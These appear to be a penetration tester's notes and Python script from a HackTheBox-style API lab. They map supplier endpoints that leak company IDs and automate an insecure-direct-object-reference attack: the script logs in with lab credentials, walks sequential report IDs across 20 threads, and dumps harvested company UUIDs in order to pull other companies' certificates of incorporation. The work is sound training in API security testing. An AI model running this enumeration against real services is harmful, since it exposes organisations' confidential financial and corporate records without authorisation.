
### [ manual testing ] ###

# 403 | GET /api/v1/supplier-companies/{ID}
    # not allowed to get a supplier directly
    # guid: ID

# 403 | GET /api/v1/suppliers/{ID}
    # not allowed to get a supplier directly
    # guid: ID

# ----------

# 200 | GET /api/v1/suppliers/quarterly-reports/{ID}
    # harvest the supplier GUIDs from here
    # int: ID += 1 

# 200 | GET /api/v1/supplier-companies/{ID}/certificates-of-incorporation
    # can retrieve company cert info via here!
    # guid: ID

# 200 | GET /api/v1/supplier-companies/yearly-reports/{ID}
    # can retrieve company cert info via here!
    # int: ID

# ----------

# <- 200 | GET http://154.57.164.76:31968/api/v1/suppliers/current-user
{
    "supplier": {
        "id":"781391c3-c6e3-4f42-bea4-1e71b6d9b4e7",
        "companyID":"b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
        "name":"HTBPentester2",
        "email":"htbpentester2@pentestercompany.com",
        "phoneNumber":"+44 9999 999992"
    }
}

# <- 200 | GET http://154.57.164.71:31255/api/v1/supplier-companies/yearly-reports/1
{
  "supplierCompanyYearlyReport": {
    "id": 1,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2020,
    "revenue": 794425112,
    "commentsFromCLevel": "Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
  }
}

test_company_uuid = 'b75a7c76-e149-4ca7-9c55-d9fc4ffa87be'
test_supplier_uuid = '781391c3-c6e3-4f42-bea4-1e71b6d9b4e7'

# ----------

### [ automation ] ###

# if this becomes too spaghetti, refactor
# actually, just refactor this for every following exercise as needed

###   write your own -> refactor with LLM -> rewrite, applying advice from LLM

import requests
import datetime
import json
import threading
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

BASE_URL = 'http://' + '154.57.164.79:30278'
JWT_REFRESH_INTERVAL = None

DEBUG_PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

EP_SWAGGER = '/swagger/index.html'
EP_SUPPLIER_AUTH = '/api/v1/authentication/suppliers/sign-in'
EP_SUPPLIER_COMPANIES = '/api/v1/supplier-companies'
EP_SUPPLIER_COMPANIES_YEARLY_REPORTS = '/api/v1/supplier-companies/yearly-reports'

LATEST_VALID_JWT = None
LATEST_JWT_TIMESTAMP = None

def safe_urljoin(base, *parts):
    """Joins multiple path segments safely."""
    # Always ensure your base URL ends with /. If it doesn't, urljoin assumes the last part of the URL is a filename and discards it to make room for the new path.
    # If your second argument starts with a /, urljoin treats it as an absolute path from the root of the domain, discarding everything after the port number in your base URL.
    for part in parts:
        # Ensure base ends in / and part doesn't start with /
        base = urljoin(base.rstrip('/') + '/', part.lstrip('/'))
    return base

def get_fresh_jwt():
    supplier_auth_headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Referer': safe_urljoin(BASE_URL, EP_SWAGGER)
    }
    supplier_auth_creds = {
        "Email": "htbpentester2@pentestercompany.com",
        "Password": "HTBPentester2"
    }
    response = requests.post(
        safe_urljoin(BASE_URL, EP_SUPPLIER_AUTH), 
        headers=supplier_auth_headers, 
        json=supplier_auth_creds,
        proxies=DEBUG_PROXIES
    )
    jwt = response.json()['jwt']
    return jwt

def _replenish_jwt():
    global LATEST_VALID_JWT, LATEST_JWT_TIMESTAMP
    LATEST_VALID_JWT = get_fresh_jwt()
    LATEST_JWT_TIMESTAMP = datetime.datetime.now().timestamp()

def get_supplier_company_COI_by_uuid(supplier_company_uuid: str):
    url = safe_urljoin(
        safe_urljoin(BASE_URL, EP_SUPPLIER_COMPANIES), 
        f'{supplier_company_uuid}/certificates-of-incorporation'
    )
    headers = { 
        # 'Content-Type': 'application/json',  # do not add this here
        'Accept': 'application/json',
        'Authorization': f'Bearer {LATEST_VALID_JWT}'
    }
    response = requests.get(url, headers=headers, proxies=DEBUG_PROXIES)
    return response.text  ## returns just the response body for now, no error handling or parsing

def get_supplier_company_yearly_report_by_id(report_id: int) -> dict:
    url = safe_urljoin(BASE_URL, EP_SUPPLIER_COMPANIES_YEARLY_REPORTS, str(report_id))
    headers = {
        'Accept': 'application/json',
        'Authorization': f'Bearer {LATEST_VALID_JWT}'
    }
    response = requests.get(url, headers=headers, proxies=DEBUG_PROXIES)
    return response.json()

def main_1():
    global LATEST_VALID_JWT

    start_report_id_to_scrape = 0
    end_report_id_to_scrape = 50

    scraped_uuids = set()
    next_report_id_to_scrape: int = -1

    jwt_lock = threading.Lock()
    next_report_id_lock = threading.Lock()
    
    # [/] login to get fresh JWT
    _replenish_jwt()

    # [] scrape supplier company UUIDs
    def task_scrape_supplier_company_uuid(task_id):
        nonlocal next_report_id_to_scrape, scraped_uuids
        nonlocal jwt_lock, next_report_id_lock
        if type(JWT_REFRESH_INTERVAL) is int:
            with jwt_lock:
                if datetime.datetime.now().timestamp() - LATEST_JWT_TIMESTAMP >= JWT_REFRESH_INTERVAL:
                    _replenish_jwt()
        with next_report_id_lock:
            next_report_id_to_scrape += 1
            current_id = next_report_id_to_scrape
        resp_json = get_supplier_company_yearly_report_by_id(current_id)
        if 'supplierCompanyYearlyReport' in resp_json:
            scraped_uuids.add(resp_json['supplierCompanyYearlyReport']['companyID'])
            print(f'{current_id}  --  found yearly report for company')
        elif 'errorMessage' in resp_json:
            print(f'{current_id}  --  {resp_json["errorMessage"]}')

    # get all responses of certificates of incorporation
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(task_scrape_supplier_company_uuid, range(start_report_id_to_scrape, end_report_id_to_scrape))

    # [/] dump supplier company UUIDs to wordlist
    uuid_dump_filename = f'output/supplier-company-uuid-dump_{datetime.datetime.now().strftime("%Y-%m-%d-_%H-%M-%S")}.txt'
    with open(uuid_dump_filename, 'w') as f:
        [f.write(uuid + '\n') for uuid in scraped_uuids]

    # can be done in ZAP or here
    # [] use supplier company UUIDs to enumerate :
        # [] /api/v1/supplier-companies/{ID}/certificates-of-incorporation
        # [] 

    # 

    # []
    ... 

if __name__ == '__main__':
    main_1()